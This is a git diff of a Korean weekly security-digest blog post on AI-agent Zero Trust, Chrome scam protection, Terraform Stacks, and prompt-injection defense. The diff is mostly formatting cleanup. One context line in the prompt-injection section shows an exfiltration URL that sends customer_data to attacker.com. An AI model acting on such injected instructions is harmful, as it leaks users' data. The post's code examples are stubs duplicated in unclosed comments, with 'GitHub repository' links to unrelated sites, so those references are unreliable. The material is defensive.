@@ -15,15 +15,6 @@ toc: true
 schema_type: Article
 ---
 
-{% include ai-summary-card.html
-  title='기술·보안 주간 다이제스트: Zero Trust for AI Agents, Chrome 기술지원 사기 방지, Terraform Stacks 혁신'
-  categories_html='<span class="category-tag security">보안</span> <span class="category-tag devsecops">DevSecOps</span>'
-  tags_html='<span class="tag">Security-Weekly</span>       <span class="tag">Zero-Trust</span>       <span class="tag">AI-Agents</span>       <span class="tag">Chrome-Security</span>       <span class="tag">Terraform</span>       <span class="tag">HashiCorp</span>       <span class="tag">Google-Security</span>       <span class="tag">Non-Human-Identity</span>'
-  highlights_html='<li><strong>포인트 1</strong>: 핵심 주제는 AI 에이전트 Zero Trust 입니다</li>       <li><strong>포인트 2</strong>: 실무 관점에서 영향 범위와 우선순위를 함께 검토해야 합니다</li>       <li><strong>포인트 3</strong>: 팀 운영에서는 재현 가능한 적용 절차와 검증 기준을 문서화해야 합니다</li>'
-  period='2026-01-26 (24시간)'
-  audience='보안/클라우드/플랫폼 엔지니어 및 기술 의사결정자'
-%}
-
 ## 경영진 요약 (Executive Summary)
 
 ### 위험 스코어카드 (Risk Scorecard)
@@ -48,19 +39,19 @@ schema_type: Article
 ### 경영진 액션 아이템 (Top 3)
 
 1. **긴급 (이번 주)**: LLM 애플리케이션 Prompt Injection 방어 구현
-   - 책임자: CISO + 개발 팀장
-   - 예산: ₩5천만 ~ ₩1억
-   - 성공 지표: 전체 LLM 엔드포인트 방어 레이어 적용률 100%
+ - 책임자: CISO + 개발 팀장
+ - 예산: ₩5천만 ~ ₩1억
+ - 성공 지표: 전체 LLM 엔드포인트 방어 레이어 적용률 100%
 
 2. **높음 (2주 이내)**: AI 에이전트 NHI 인벤토리 구축 및 동적 자격증명 전환 계획 수립
-   - 책임자: 보안 아키텍처 팀 + DevOps 리더
-   - 예산: ₩1억 ~ ₩3억
-   - 성공 지표: 전체 NHI 식별률 95% + Vault 파일럿 완료
+ - 책임자: 보안 아키텍처 팀 + DevOps 리더
+ - 예산: ₩1억 ~ ₩3억
+ - 성공 지표: 전체 NHI 식별률 95% + Vault 파일럿 완료
 
 3. **중간 (1개월 이내)**: Terraform Stacks 기반 IaC 통합 전략 수립
-   - 책임자: 인프라 팀장
-   - 예산: ₩5천만 ~ ₩2억
-   - 성공 지표: 모노레포 전환 로드맵 완성 + 파일럿 프로젝트 1건
+ - 책임자: 인프라 팀장
+ - 예산: ₩5천만 ~ ₩2억
+ - 성공 지표: 모노레포 전환 로드맵 완성 + 파일럿 프로젝트 1건
 
 ---
 
@@ -203,16 +194,16 @@ graph TD
 HashiCorp는 Vault를 중심으로 한 NHI 관리 아키텍처를 권장합니다:
 
 > **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/aws-samples)를 참조하세요.
-> 
+>
 > ```mermaid
-> graph LR...
+> graph LR
 > ```
 
 <!-- 전체 코드는 위 GitHub 링크 참조
 > **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/aws-samples)를 참조하세요.
-> 
+>
 > ```mermaid
-> graph LR...
+> graph LR
 > ```
 
 <!-- 전체 코드는 위 GitHub 링크 참조
@@ -244,16 +235,16 @@ graph LR
 **Vault Agent 설정 예시:**
 
 > **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
-> 
+>
 > ```yaml
-> # Vault Agent 설정 예시 - AI 에이전트용...
+> # Vault Agent 설정 예시 - AI 에이전트용
 > ```
 
 <!-- 전체 코드는 위 GitHub 링크 참조
 > **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
-> 
+>
 > ```yaml
-> # Vault Agent 설정 예시 - AI 에이전트용...
+> # Vault Agent 설정 예시 - AI 에이전트용
 > ```
 
 <!-- 전체 코드는 위 GitHub 링크 참조
@@ -326,16 +317,16 @@ Vault: /secret/data/production/database/admin
 **쿼리 1: 장기 존속 NHI 토큰 탐지**
 
 > **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/python/cpython/tree/main/Doc)를 참조하세요.
-> 
+>
 > ```python
-> # Vault audit log 분석...
+> # Vault audit log 분석
 > ```
 
 <!-- 전체 코드는 위 GitHub 링크 참조
 > **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/python/cpython/tree/main/Doc)를 참조하세요.
-> 
+>
 > ```python
-> # Vault audit log 분석...
+> # Vault audit log 분석
 > ```
 
 <!-- 전체 코드는 위 GitHub 링크 참조
@@ -565,16 +556,16 @@ DeviceEvents
 조직에서 Chrome 보안 기능을 활성화하는 방법:
 
 > **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://www.json.org/json-en.html)를 참조하세요.
-> 
+>
 > ```json
-> // Chrome Enterprise 정책 예시...
+> // Chrome Enterprise 정책 예시
 > ```
 
 <!-- 전체 코드는 위 GitHub 링크 참조
 > **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://www.json.org/json-en.html)를 참조하세요.
-> 
+>
 > ```json
-> // Chrome Enterprise 정책 예시...
+> // Chrome Enterprise 정책 예시
 > ```
 
 <!-- 전체 코드는 위 GitHub 링크 참조
@@ -662,16 +653,16 @@ HashiCorp가 **Terraform Stacks**와 함께 네이티브 모노레포 지원을 
 ### 3.2 Stack 구조 예시
 
 > **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
-> 
+>
 > ```hcl
-> # stacks/production/main.tfstack.hcl...
+> # stacks/production/main.tfstack.hcl
 > ```
 
 <!-- 전체 코드는 위 GitHub 링크 참조
 > **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
-> 
+>
 > ```hcl
-> # stacks/production/main.tfstack.hcl...
+> # stacks/production/main.tfstack.hcl
 > ```
 
 <!-- 전체 코드는 위 GitHub 링크 참조
@@ -719,16 +710,16 @@ stack {
 **시나리오: Terraform 상태 파일 탈취 후 인프라 파괴**
 
 > **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/aws-samples)를 참조하세요.
-> 
+>
 > ```
-> [1단계: 초기 침투]...
+> [1단계: 초기 침투]
 > ```
 
 <!-- 전체 코드는 위 GitHub 링크 참조
 > **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/aws-samples)를 참조하세요.
-> 
+>
 > ```
-> [1단계: 초기 침투]...
+> [1단계: 초기 침투]
 > ```
 
 <!-- 전체 코드는 위 GitHub 링크 참조
@@ -774,16 +765,16 @@ S3 버킷: s3://company-terraform-state/prod/terraform.tfstate
 **쿼리 1: 비승인 Terraform 명령어 실행 탐지**
 
 > **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/aws-samples)를 참조하세요.
-> 
+>
 > ```python
-> # CloudTrail 로그 분석 (AWS)...
+> # CloudTrail 로그 분석 (AWS)
 > ```
 
 <!-- 전체 코드는 위 GitHub 링크 참조
 > **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/aws-samples)를 참조하세요.
-> 
+>
 > ```python
-> # CloudTrail 로그 분석 (AWS)...
+> # CloudTrail 로그 분석 (AWS)
 > ```
 
 <!-- 전체 코드는 위 GitHub 링크 참조
@@ -961,7 +952,7 @@ graph TD
 
 <div class="post-image-container">
 3계층 방어 시스템으로 구성된 PromptDefense 클래스 아키텍처입니다.
-  <p class="image-caption">PromptDefense 클래스 아키텍처 - 3계층 방어 시스템</p>
+ <p class="image-caption">PromptDefense 클래스 아키텍처 - 3계층 방어 시스템</p>
 </div>
 
 ![PromptDefense Class Architecture - 3-layer defense: Input Validation, Safe Prompt Building, Output Validation](/assets/images/diagrams/2026-01-26-prompt-defense-architecture.svg)
@@ -1056,16 +1047,16 @@ https://attacker.com/receive?data={% raw %}{{customer_data}}{% endraw %}
 **쿼리 1: 반복적인 Prompt Injection 시도 탐지**
 
 > **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/python/cpython/tree/main/Doc)를 참조하세요.
-> 
+>
 > ```python
-> # LLM API 로그 분석...
+> # LLM API 로그 분석
 > ```
 
 <!-- 전체 코드는 위 GitHub 링크 참조
 > **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/python/cpython/tree/main/Doc)를 참조하세요.
-> 
+>
 > ```python
-> # LLM API 로그 분석...
+> # LLM API 로그 분석
 > ```
 
 <!-- 전체 코드는 위 GitHub 링크 참조
@@ -1141,16 +1132,16 @@ index=llm_api sourcetype=api:request
 ### 4.6 실무 방어 코드 예시
 
 > **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/python/cpython/tree/main/Doc)를 참조하세요.
-> 
+>
 > ```python
-> # prompt_injection_defense.py...
+> # prompt_injection_defense.py
 > ```
 
 <!-- 전체 코드는 위 GitHub 링크 참조
 > **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/python/cpython/tree/main/Doc)를 참조하세요.
-> 
+>
 > ```python
-> # prompt_injection_defense.py...
+> # prompt_injection_defense.py
 > ```
 
 <!-- 전체 코드는 위 GitHub 링크 참조
